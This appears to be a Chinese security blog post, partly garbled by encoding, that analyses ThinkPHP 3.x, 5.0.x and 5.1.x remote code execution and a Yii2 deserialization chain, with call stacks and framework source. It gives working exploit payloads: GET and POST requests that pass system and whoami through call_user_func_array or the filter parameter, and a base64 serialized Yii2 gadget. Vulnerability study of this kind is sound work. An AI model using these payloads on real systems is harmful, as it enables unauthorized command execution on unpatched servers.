<p><code>Behavior\ParseTemplateBehavior:run</code>ï¼Œç”±äºç¼“å­˜çš„æ–‡ä»¶éƒ½ä¸ºç©ºï¼Œå¹¶ä¸”æ˜¯thinkphpçš„æ¨¡æ¿ï¼Œæ‰€æœ‰ç›´æ¥è¿›å»ç¬¬ä¸€ä¸ªelseï¼Œç›´æ¥è°ƒç”¨åˆ°äº†<code>Think\Template:fetch</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params">&amp;<span class="variable">$_data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$engine</span>             =   strtolower(C(<span class="string">&#x27;TMPL_ENGINE_TYPE&#x27;</span>));</span><br><span class="line">        <span class="variable">$_content</span>           =   <span class="keyword">empty</span>(<span class="variable">$_data</span>[<span class="string">&#x27;content&#x27;</span>])?<span class="variable">$_data</span>[<span class="string">&#x27;file&#x27;</span>]:<span class="variable">$_data</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">        <span class="variable">$_data</span>[<span class="string">&#x27;prefix&#x27;</span>]    =   !<span class="keyword">empty</span>(<span class="variable">$_data</span>[<span class="string">&#x27;prefix&#x27;</span>])?<span class="variable">$_data</span>[<span class="string">&#x27;prefix&#x27;</span>]:C(<span class="string">&#x27;TMPL_CACHE_PREFIX&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;think&#x27;</span>==<span class="variable">$engine</span>)&#123; <span class="comment">// é‡‡ç”¨Thinkæ¨¡æ¿å¼•æ“</span></span><br><span class="line">            <span class="keyword">if</span>((!<span class="keyword">empty</span>(<span class="variable">$_data</span>[<span class="string">&#x27;content&#x27;</span>]) &amp;&amp; <span class="keyword">$this</span>-&gt;checkContentCache(<span class="variable">$_data</span>[<span class="string">&#x27;content&#x27;</span>],<span class="variable">$_data</span>[<span class="string">&#x27;prefix&#x27;</span>])) </span><br><span class="line">                ||  <span class="keyword">$this</span>-&gt;checkCache(<span class="variable">$_data</span>[<span class="string">&#x27;file&#x27;</span>],<span class="variable">$_data</span>[<span class="string">&#x27;prefix&#x27;</span>])) &#123; <span class="comment">// ç¼“å­˜æœ‰æ•ˆ</span></span><br><span class="line">                <span class="comment">//è½½å…¥æ¨¡ç‰ˆç¼“å­˜æ–‡ä»¶</span></span><br><span class="line">                Storage::load(C(<span class="string">&#x27;CACHE_PATH&#x27;</span>).<span class="variable">$_data</span>[<span class="string">&#x27;prefix&#x27;</span>].md5(<span class="variable">$_content</span>).C(<span class="string">&#x27;TMPL_CACHFILE_SUFFIX&#x27;</span>),<span class="variable">$_data</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$tpl</span> = Think::instance(<span class="string">&#x27;Think\\Template&#x27;</span>);</span><br><span class="line">                <span class="comment">// ç¼–è¯‘å¹¶åŠ è½½æ¨¡æ¿æ–‡ä»¶</span></span><br><span class="line">                <span class="variable">$tpl</span>-&gt;fetch(<span class="variable">$_content</span>,<span class="variable">$_data</span>[<span class="string">&#x27;var&#x27;</span>],<span class="variable">$_data</span>[<span class="string">&#x27;prefix&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            â€¦â€¦</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"><span class="variable">$templateFile</span>,<span class="variable">$templateVar</span>,<span class="variable">$prefix</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;tVar         =   <span class="variable">$templateVar</span>;</span><br><span class="line">    <span class="variable">$templateCacheFile</span>  =   <span class="keyword">$this</span>-&gt;loadTemplate(<span class="variable">$templateFile</span>,<span class="variable">$prefix</span>);</span><br><span class="line">    Storage::load(<span class="variable">$templateCacheFile</span>,<span class="keyword">$this</span>-&gt;tVar,<span class="literal">null</span>,<span class="string">&#x27;tpl&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯¹æ•°ç»„è¿›è¡Œå˜é‡è¦†ç›–ä½¿å¾—æˆ‘ä»¬ä¼ è¿›å»çš„ï¼Œ<code>value[_filename]</code>çš„å€¼å˜ä¸ºå˜é‡è¦†ç›–ä¹‹å<code>$_filename</code>çš„å€¼ï¼Œå®ç°æ—¥å¿—æ–‡ä»¶åŒ…å«</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"><span class="variable">$_filename</span>,<span class="variable">$vars</span>=<span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(!is_null(<span class="variable">$vars</span>))&#123;</span><br><span class="line">          extract(<span class="variable">$vars</span>, EXTR_OVERWRITE); </span><br><span class="line">           <span class="comment">// [_filename]=&#x27;./Application/Runtime/Logs/Home/XX.XX.XX.log&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">include</span> <span class="variable">$_filename</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="ThinkPHP5-0-xRCE"><a href="#ThinkPHP5-0-xRCE" class="headerlink" title="ThinkPHP5.0.xRCE"></a>ThinkPHP5.0.xRCE</h2><h3 id="ç¯å¢ƒ-1"><a href="#ç¯å¢ƒ-1" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><p>thinkphp5.0.10</p>
<p>win10</p>
<p>phpstudy8 php5.6</p>
<h3 id="æ¼æ´å¤ç°-1"><a href="#æ¼æ´å¤ç°-1" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><h4 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><p><img src="https://img-blog.csdnimg.cn/27f610de2b89421baa6de433d240cf2e.png" alt="img"></p>
<p>pocï¼š</p>
<p>get:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>

<p>post:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=captcha</span><br><span class="line">post:</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure>

<h4 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><ul>
<li>POST</li>
</ul>
<p>é¦–å…ˆæ—¢ç„¶æ˜¯RCEï¼Œé‚£å°±å…ˆè¦æ‰¾åˆ°æˆ‘ä»¬æœ€åæƒ³è¦åˆ©ç”¨çš„æ‰§è¡Œä»£ç çš„æ–¹æ³•ï¼Œå¯ä»¥å…¨å±€æœç´¢ä¸€ä¸‹ä¸€äº›å¸¸ç”¨çš„æ–¹æ³•ï¼Œæ¯”å¦‚<code>eval</code>|<code>call_user_func</code>ä¹‹ç±»çš„</p>
<p>å…¨å±€æœç´¢ä¸€ä¸‹å‘ç°<code>call_user_func</code>å¾ˆå¤šï¼Œä½†æ˜¯å®é™…ä¸Šå¯ä»¥ç”¨çš„å¾ˆå°‘ï¼Œä¸è¿‡å¯ä»¥åœ¨<code>Request::filterValue</code>ä¹Ÿå‘ç°äº†è¯¥æ–¹æ³•ï¼Œé‚£ä¹ˆå¯ä»¥å…ˆæ¥åˆ†æä¸€ä¸‹è¿™é‡Œçš„<code>call_user_func</code>æ€ä¹ˆæ ·æ‰èƒ½æ­£ç¡®åˆ©ç”¨ï¼Œè¿™é‡Œå›è°ƒå‡½æ•°ä¸º<code>$filter</code>ï¼Œå˜é‡ä¸º<code>$value</code>ï¼Œé‚£ä¹ˆé‡ç‚¹å°±æ˜¯çœ‹ä¸¤ä¸ªå‚æ•°æ˜¯æ€ä¹ˆä¼ è¿›å»çš„ï¼Œé‚£å°±å»çœ‹ä¸€ä¸‹ä¼šåœ¨å“ªé‡Œè°ƒç”¨åˆ°<code>filterValue</code></p>
<p><img src="https://img-blog.csdnimg.cn/10381b87335c45b28a56231326d8cebc.png" alt="img"></p>
<blockquote>
<p> ä½†æ˜¯ä½œä¸ºä¸€åªèœé¸¡æ¥è¯´ï¼Œè¿˜ä¸ä¼šè‡ªå·±æŒ–æ´é‚£å°±åªèƒ½ç›´æ¥è·Ÿç€payloadçš„æ€è·¯èµ°äº†</p>
</blockquote>
<p>è´´ä¸Šè°ƒç”¨æ ˆï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Request.php:1060, think\Request-&gt;filterValue()</span><br><span class="line">Request.php:1007, array_walk_recursive()</span><br><span class="line">Request.php:1007, think\Request-&gt;input()</span><br><span class="line">Request.php:642, think\Request-&gt;param()</span><br><span class="line">App.php:304, think\App::exec()</span><br><span class="line">Request.php:501, think\Request-&gt;method()</span><br><span class="line">Request.php:524, think\Request-&gt;isGet()</span><br><span class="line">Route.php:1507, think\Route::parseRule()</span><br><span class="line">Route.php:1189, think\Route::checkRule()</span><br><span class="line">Route.php:950, think\Route::checkRoute()</span><br><span class="line">Route.php:873, think\Route::check()</span><br><span class="line">App.php:562, think\App::routeCheck()</span><br><span class="line">App.php:123, think\App::run()</span><br><span class="line">start.php:18, require()</span><br><span class="line">index.php:17, &#123;main&#125;()</span><br></pre></td></tr></table></figure>

<p><code>App::run</code>ï¼Œæ•´ä¸ªåº”ç”¨ä»è¿™å¼€å§‹ï¼Œé€šè¿‡è°ƒç”¨å¯ç”¨æ–¹æ³•æ£€æµ‹è·¯ç”±ä»¥åŠè·å–å›è°ƒå‡½æ•°ç­‰ï¼Œå¹¶åœ¨æœ€åè¿”å›å“åº”å€¼</p>
<p>æ­¤æ—¶çš„<code>$request</code>ä¸º<code>Request</code>ï¼Œ<code>config</code>è¢«åˆå§‹åŒ–ä¸ºé…ç½®ä¿¡æ¯</p>
<p><img src="https://img-blog.csdnimg.cn/75394cae4fa944b28dabdcf2463013cc.png" alt="img"></p>
<p><code>App::routeCheck</code>è¿›è¡Œè·¯ç”±æ£€æµ‹ï¼Œè€Œ<code>$path</code>ä¼šè°ƒç”¨åˆ°<code>Request::pathinfo</code>ï¼Œå…¶ä¸­config[â€˜var_pathinfoâ€™]æ‰€å¯¹åº”çš„å€¼ä¸º<code>s</code>æ‰€ä»¥å¦‚æœåœ¨urlä¸­åˆ©ç”¨getæ–¹æ³•ä¼ <code>s=?</code>å…¶å€¼å³ä¸ºè·¯ç”±</p>
<p>è€Œ<code>$depr</code>çš„å€¼ä¸º<code>/</code></p>
<p><img src="https://img-blog.csdnimg.cn/239853ebe1a54f479ef31754c0ec92db.png" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/7d1957859e6542de8c9f66b800fb9586.png" alt="img"></p>
<p>ä¹‹åä¼šé€šè¿‡<code>Route::check</code>è°ƒç”¨åˆ°äº†<code>Request::method</code></p>
<p><img src="https://img-blog.csdnimg.cn/96efd174745d48c1bb5c4d959cb449e9.png" alt="img"></p>
<p><code>Request::method</code>å¦‚å›¾ï¼ˆåœ¨åç»­æ›´æ–°ä¸­ä¼šå¯¹<code>$this-&gt;method</code>çš„å€¼è¿›è¡Œç™½åå•è¿‡æ»¤</p>
<p><img src="https://img-blog.csdnimg.cn/751025e4ef774512a36cff0886f6c732.png" alt="img"></p>
<p>æ ¹æ®ä»£ç æˆ‘ä»¬å¯ä»¥çŸ¥é“æˆ‘ä»¬å¯ä»¥é€šè¿‡postä¸Šä¼ <code>_method</code>ï¼Œå†åœ¨ä¸‹é¢æ‰§è¡Œ<code>$this-&gt;$_method($_POST)</code></p>
<p>ç”±äºå¯¹æ•´ä¸ªthinkphpæ¡†æ¶è¿˜æ˜¯ä¸å¤Ÿäº†è§£ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘å°±ç›´æ¥æŠŠåœ¨<code>Config:get</code>ä¸­è¿›è¡Œvard_umpå¾—çŸ¥è¿”å›å€¼ä¸º<code>_method</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡postä¸Šä¼ <code>_method</code>æ¥æ§åˆ¶æ‰§è¡Œçš„æ–¹æ³•äº†ï¼Œè€Œpayloadä¸­ä¼ è¿›å»çš„ä¸º<code>__construct</code></p>
<p><code>Request::__construct</code>ï¼Œå…¶ä¸­<code>options</code>ä¸ºæˆ‘ä»¬<code>POST</code>æ•°ç»„ï¼Œä¼šç”¨property_existsæ£€æµ‹æ­¤ç±»ä¸­æ˜¯å¦å­˜åœ¨è¯¥å±æ€§ï¼Œå¦‚æœå­˜åœ¨åˆ™ç›´æ¥èµ‹å€¼å¯¼è‡´æˆ‘ä»¬å¯ä»¥é€šè¿‡postä¼ å…¥åŒåå±æ€§ä»è€Œæ§åˆ¶æ‰€æœ‰å±æ€§çš„å€¼ï¼Œè€Œ<code>input</code>ä¼šå°†postå­—ç¬¦ä¸²ä¿å­˜ä¸‹æ¥</p>
<p>æœ€å<code>method</code>æ–¹æ³•å°†å±æ€§<code>method</code>è¿”å›ï¼Œè€Œ<code>method</code>å±æ€§å·²ç»è¢«æˆ‘ä»¬ä¿®æ”¹ä¸º<code>get</code></p>
<p><img src="https://img-blog.csdnimg.cn/4d7b9eb3905146c6805a4fc3af3d8a26.png" alt="img"></p>
<p>ä¹‹åå°±æ˜¯ç»§ç»­æ£€æµ‹sä¼ è¿›çš„è·¯ç”±å¹¶è¿”å›URLè°ƒåº¦ï¼Œå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\phpstudy_pro\WWW\cms\thinkphp\library\think\App.php:567:</span><br><span class="line">array (size=3)</span><br><span class="line">  &#x27;type&#x27; =&gt; string &#x27;method&#x27; (length=6)</span><br><span class="line">  &#x27;method&#x27; =&gt; </span><br><span class="line">    array (size=2)</span><br><span class="line">      0 =&gt; string &#x27;\think\captcha\CaptchaController&#x27; (length=32)</span><br><span class="line">      1 =&gt; string &#x27;index&#x27; (length=5)</span><br><span class="line">  &#x27;var&#x27; =&gt; </span><br><span class="line">    array (size=0)</span><br><span class="line">      empty</span><br></pre></td></tr></table></figure>

<p>åœ¨ä¹‹åçš„<code>exec</code>æ ¹æ®URLè°ƒåº¦ä¸­<code>type =&gt; &#39;method&#39;</code>ä»è€Œæ‰§è¡Œå›è°ƒæ–¹æ³•ï¼Œè°ƒç”¨åˆ°<code>param</code>æ–¹æ³•ï¼Œå†è°ƒç”¨åˆ°<code>input</code>æ–¹æ³•å°†postä¸­æ‰€è¯·æ±‚çš„ä¿¡æ¯ç­‰åˆå¹¶é€šè¿‡<code>$data</code>ä¼ äº†è¿›å»ï¼Œä»è€Œåœ¨è°ƒç”¨åˆ°<code>Request::filterValue</code>çš„æ—¶å€™<code>$data</code>åŒ…å«äº†æˆ‘ä»¬æ‰€ä¼ å…¥çš„ä¿¡æ¯.</p>
<p><img src="https://img-blog.csdnimg.cn/980cd3bb96da47d9949a1387cf568ce4.png" alt="img"></p>
<p>æœ€ç»ˆåˆ°è¾¾<code>Request::filterValue</code>ï¼Œæ­¤æ—¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filter =&gt; system</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\phpstudy_pro\WWW\cms\thinkphp\library\think\Request.php:1004:</span><br><span class="line">array (size=5)</span><br><span class="line">  &#x27;_method&#x27; =&gt; string &#x27;__construct&#x27; (length=11)</span><br><span class="line">  &#x27;filter&#x27; =&gt; </span><br><span class="line">    array (size=1)</span><br><span class="line">      0 =&gt; string &#x27;system&#x27; (length=6)</span><br><span class="line">  &#x27;method&#x27; =&gt; string &#x27;get&#x27; (length=3)</span><br><span class="line">  &#x27;ameuu&#x27; =&gt; </span><br><span class="line">    array (size=1)</span><br><span class="line">      0 =&gt; string &#x27;whoami&#x27; (length=6)</span><br><span class="line">  &#x27;id&#x27; =&gt; null</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡<code>call_user_func</code>æ‰§è¡Œå›è°ƒå‡½æ•°è€Œæ‰§è¡Œæ•°ç»„çš„äº”ä¸ªå‚æ•°ï¼Œä»è€Œæœ€ç»ˆå®ç°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/10381b87335c45b28a56231326d8cebc.png" alt="img"></p>
<ul>
<li>get</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">App.php:200, think\App::invokeMethod()</span><br><span class="line">App.php:412, think\App::module()</span><br><span class="line">App.php:299, think\App::exec()</span><br><span class="line">App.php:125, think\App::run()</span><br><span class="line">start.php:18, require()</span><br><span class="line">index.php:17, &#123;main&#125;()</span><br></pre></td></tr></table></figure>

<p>getæœ€ååˆ©ç”¨åå°„çš„æ–¹æ³•è¿›è¡Œä»£ç æ‰§è¡Œ</p>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHelloTo</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Hello &#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$reflectionMethod</span> = <span class="keyword">new</span> ReflectionMethod(<span class="string">&#x27;HelloWorld&#x27;</span>, <span class="string">&#x27;sayHelloTo&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$reflectionMethod</span>-&gt;invokeArgs(<span class="keyword">new</span> HelloWorld(), <span class="keyword">array</span>(<span class="string">&#x27;Mike&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/9e941f6451df4f9ab81e4e160523adb1.png" alt="img"></p>
<p>å‰é¢åˆ°execå‡½æ•°è°ƒç”¨éƒ½ä¸€æ ·ï¼Œä½†æ˜¯ç”±äºsçš„å€¼å˜æˆäº†<code>index/\think\app/invokefunction</code>ï¼Œæ‰€ä»¥åœ¨æ£€æµ‹è·¯ç”±çš„æ—¶å€™æ‰€è¿”å›çš„ç»“æœå‘ç”Ÿå˜åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\phpstudy_pro\WWW\cms\thinkphp\library\think\App.php:108:</span><br><span class="line">array (size=2)</span><br><span class="line">  &#x27;type&#x27; =&gt; string &#x27;module&#x27; (length=6)</span><br><span class="line">  &#x27;module&#x27; =&gt; </span><br><span class="line">    array (size=3)</span><br><span class="line">      0 =&gt; string &#x27;index&#x27; (length=5)</span><br><span class="line">      1 =&gt; string &#x27;\think\app&#x27; (length=10)</span><br><span class="line">      2 =&gt; string &#x27;invokefunction&#x27; (length=14)</span><br></pre></td></tr></table></figure>

<p>è¿™ä¹Ÿä½¿å¾—åœ¨execä¸­æˆ‘ä»¬æ‰€æ‰§è¡Œçš„æ–¹æ³•ä¸º</p>
<p><img src="https://img-blog.csdnimg.cn/c188bdd511d3441cad878d6ee38d0bfe.png" alt="img"></p>
<p>å†è°ƒç”¨<code>App::invokeMethod</code>æ‰§è¡Œ<code>&#123;think\app,invokefunction&#125;</code>æ–¹æ³•ï¼Œè€Œè¯¥æ–¹æ³•çš„å‚æ•°é€šè¿‡<code>App::bindParams</code>è¿›è¡Œè·å–</p>
<p><img src="https://img-blog.csdnimg.cn/44402c24b30b41b199ef58ae102f72b7.png" alt="img"></p>
<p>è·å–åˆ°æˆ‘ä»¬æ‰€ä¼ è¿›å»çš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function=call_user_func</span><br><span class="line">var[0]=system</span><br><span class="line">var[1][]=whoami</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/7e6879d690cf42a0831abb5ba740f479.png" alt="img"></p>
<p>ä¹‹åå°±æ˜¯åˆ©ç”¨åå°„æ‰§è¡Œ<code>call_user_func</code></p>
<h2 id="ThinkPHP5-1-xRCE"><a href="#ThinkPHP5-1-xRCE" class="headerlink" title="ThinkPHP5.1.xRCE"></a>ThinkPHP5.1.xRCE</h2><h3 id="ç¯å¢ƒ-2"><a href="#ç¯å¢ƒ-2" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><p>thinkphp5.1.x</p>
<p>win10</p>
<p>phpstudy8 php5.6</p>
<h3 id="æ¼æ´å¤ç°-2"><a href="#æ¼æ´å¤ç°-2" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><h4 id="åˆ©ç”¨-2"><a href="#åˆ©ç”¨-2" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line">or</span><br><span class="line">?s=index/\think\container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>

<h4 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>è°ƒç”¨æ ˆï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Container.php:320, think\Container-&gt;invokeFunction()</span><br><span class="line">Container.php:372, ReflectionMethod-&gt;invokeArgs()</span><br><span class="line">Container.php:372, think\Container-&gt;invokeReflectMethod()</span><br><span class="line">Module.php:129, think\route\dispatch\Module-&gt;think\route\dispatch\&#123;closure&#125;()</span><br><span class="line">Middleware.php:176, call_user_func_array:&#123;D:\phpstudy_pro\WWW\cms\tp5\tp5\thinkphp\library\think\Middleware.php:176&#125;()</span><br><span class="line">Middleware.php:176, think\Middleware-&gt;think\&#123;closure&#125;()</span><br><span class="line">Middleware.php:121, call_user_func:&#123;D:\phpstudy_pro\WWW\cms\tp5\tp5\thinkphp\library\think\Middleware.php:121&#125;()</span><br><span class="line">Middleware.php:121, think\Middleware-&gt;dispatch()</span><br><span class="line">Module.php:134, think\route\dispatch\Module-&gt;exec()</span><br><span class="line">Dispatch.php:167, think\route\Dispatch-&gt;run()</span><br><span class="line">App.php:432, think\App-&gt;think\&#123;closure&#125;()</span><br><span class="line">Middleware.php:176, call_user_func_array:&#123;D:\phpstudy_pro\WWW\cms\tp5\tp5\thinkphp\library\think\Middleware.php:176&#125;()</span><br><span class="line">Middleware.php:176, think\Middleware-&gt;think\&#123;closure&#125;()</span><br><span class="line">Middleware.php:121, call_user_func:&#123;D:\phpstudy_pro\WWW\cms\tp5\tp5\thinkphp\library\think\Middleware.php:121&#125;()</span><br><span class="line">Middleware.php:121, think\Middleware-&gt;dispatch()</span><br><span class="line">App.php:435, think\App-&gt;run()</span><br><span class="line">index.php:21, &#123;main&#125;()</span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆåˆ©ç”¨ç‚¹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invokeFunction</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$vars</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$reflect</span> = <span class="keyword">new</span> ReflectionFunction(<span class="variable">$function</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$args</span> = <span class="keyword">$this</span>-&gt;bindParams(<span class="variable">$reflect</span>, <span class="variable">$vars</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="variable">$function</span>, <span class="variable">$args</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ReflectionException <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;function not exists: &#x27;</span> . <span class="variable">$function</span> . <span class="string">&#x27;()&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>GETå¯ç”¨</li>
</ul>
<p>å’Œå‰é¢ä¸€æ ·ï¼Œä¾æ—§ä»<code>App::run</code>å¼€å§‹ï¼Œä¼šå…ˆè¿›è¡Œè·¯ç”±æ£€æµ‹ï¼Œè€Œé€šè¿‡thinkphpä¼ å‚ï¼Œæˆ‘ä»¬åˆ©ç”¨getä¼ <code>s</code>ï¼ˆç›¸å½“äºPATHINFOï¼‰ï¼Œå°†æˆ‘ä»¬è¦åˆ©ç”¨çš„æ§åˆ¶å™¨ä¼ è¿›å»</p>
<p>åœ¨<code>App::checkRoute</code>ä¸­ä¼šè°ƒç”¨åˆ°<code>Route::check</code>ï¼Œè¿›è¡Œè·¯ç”±æ£€æµ‹ï¼Œå°†urlï¼ˆsçš„å€¼ï¼‰å°†<code>/</code>æ›¿æ¢æˆ<code>|</code>ç„¶åè¿”å›ä¸€ä¸ª<code>Url</code>ï¼ˆç»§æ‰¿Dispatchï¼‰ç±»ï¼Œæœ€åè¿”å›è‡³<code>App::run</code></p>
<p><img src="https://img-blog.csdnimg.cn/7384cb0561bd48759d38125f5309c84e.png" alt="img"></p>
<p>è°ƒç”¨åˆ°<code>Url::init</code>,æœ€ç»ˆ<code>$dispatch</code>ä¸º<code>Module</code>ç±»</p>
<p>ä¹‹åæ‰§è¡Œè·¯ç”±è°ƒåº¦ï¼Œè°ƒç”¨<code>Module::exec</code>è·å¾—data</p>
<p>åœ¨<code>Module::exec</code>ä¸­ä¼šåˆ©ç”¨åå°„çš„æ–¹æ³•è·å–å½“å‰éœ€è¦æ“ä½œçš„æ–¹æ³•ï¼Œå¹¶é€šè¿‡<code>Request</code>ç±»è·å–urlä¸­æˆ‘ä»¬ä¼ å…¥çš„å˜é‡ï¼Œå› ä¸ºè¿™äº›éƒ½æ˜¯ä¸€å¼€å§‹ä¿å­˜åœ¨äº†Requestç±»ä¸­</p>
<p><img src="https://img-blog.csdnimg.cn/45b02b7e5ab4492c951089bb40168379.png" alt="img"></p>
<p>æœ€åé€šè¿‡åå°„çš„æ–¹æ³•ï¼Œè°ƒç”¨åˆ°äº†<code>Container::invokefunction</code>ï¼Œå®ç°RCE</p>
<ul>
<li>POSTä¸èƒ½ç”¨ </li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/c147d778eee24d58adf02408fe3b907d.png" alt="img"></p>
<h4 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h4><p>é€šè¿‡å’Œ<code>5.1.41</code>æ¯”è¾ƒå°±å¯ä»¥å‘ç°<code>dispatcha\Url::parseUrl</code></p>
<p><img src="https://img-blog.csdnimg.cn/f75c49f822eb4fcfaff15a7da2a3d57b.png" alt="img"></p>
<h2 id="Yii2-ååºåˆ—åŒ–"><a href="#Yii2-ååºåˆ—åŒ–" class="headerlink" title="Yii2 ååºåˆ—åŒ–"></a>Yii2 ååºåˆ—åŒ–</h2><p><a href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">https://github.com/yiisoft/yii2/releases/tag/2.0.37</a></p>
<p>ç¯å¢ƒæ­å»ºè¯¦è§reference</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220518093326494.png" alt="image-20220518093326494"></p>
<h3 id="æ¼æ´å¤ç°-3"><a href="#æ¼æ´å¤ç°-3" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><h4 id="åˆ©ç”¨-3"><a href="#åˆ©ç”¨-3" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?r=exp/sss&amp;data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NzoicGhwaW5mbyI7czoyOiJpZCI7czoxOiIxIjt9aToxO3M6MzoicnVuIjt9fX19</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/e16ed3b9f69d479797e288c2033d3d9e.png" alt="img"></p>
